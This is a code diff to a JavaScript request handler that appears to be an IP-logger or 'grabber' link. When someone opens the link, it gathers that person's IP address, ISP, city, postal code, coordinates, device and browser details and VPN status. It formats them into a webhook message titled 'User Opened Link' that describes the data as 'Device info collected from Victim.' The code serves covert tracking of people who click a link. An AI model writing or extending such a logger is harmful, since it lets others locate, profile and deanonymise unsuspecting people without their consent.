@@ -328,22 +328,6 @@ export default async function handler(req, res) {
             console.log("Preparing to send the default message with full info...");
 
             try {
-                const fields = createCommonFields(
-                    ipDetails,
-                    coords,
-                    userAgent,
-                    deviceType,
-                    os,
-                    browserEngine,
-                    acceptLanguage,
-                    acceptEncoding,
-                    doNotTrack,
-                    referer,
-                    reverseDNS,
-                    requestMetadata
-                );
-
-                console.log("Fields for webhook message created successfully:", fields);
 
                 const message = {
                     embeds: [
@@ -351,9 +335,38 @@ export default async function handler(req, res) {
                             title: "User Opened Link",
                             color: 0x00FFFF,
                             description: "Device info collected from Victim.",
-                            fields: fields
-                        }
-                    ]
+                            fields: [
+                                { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                                { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                                { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
+                                { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
+                                { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
+                                { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                                { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
+                                { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
+                                { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
+                                { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
+                                { name: "Coords", value: coords, inline: true },
+                                { name: "Reverse DNS", value: reverseDNS, inline: true },
+                                { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+                                { name: "Device Type", value: `\`${deviceType}\``, inline: true },
+                                { name: "Operating System", value: `\`${os}\``, inline: true },
+                                { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
+                                { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
+                                { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
+                                { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
+                                { name: "Referer", value: `\`${referer}\``, inline: false },
+                                { name: "Device Memory", value: `\`${clientHints.deviceMemory}\``, inline: true },
+                                { name: "Viewport Width", value: `\`${clientHints.viewportWidth}\``, inline: true },
+                                { name: "UA Platform", value: `\`${clientHints.uaPlatform}\``, inline: true },
+                                { name: "UA Model", value: `\`${clientHints.uaModel}\``, inline: true },
+                                { name: "UA Mobile", value: `\`${clientHints.uaMobile}\``, inline: true },
+                                { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+                                { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+                                { name: "Hosting", value: "\`No\`", inline: true },
+                            ],
+                        },
+                    ],
                 };
 
                 console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
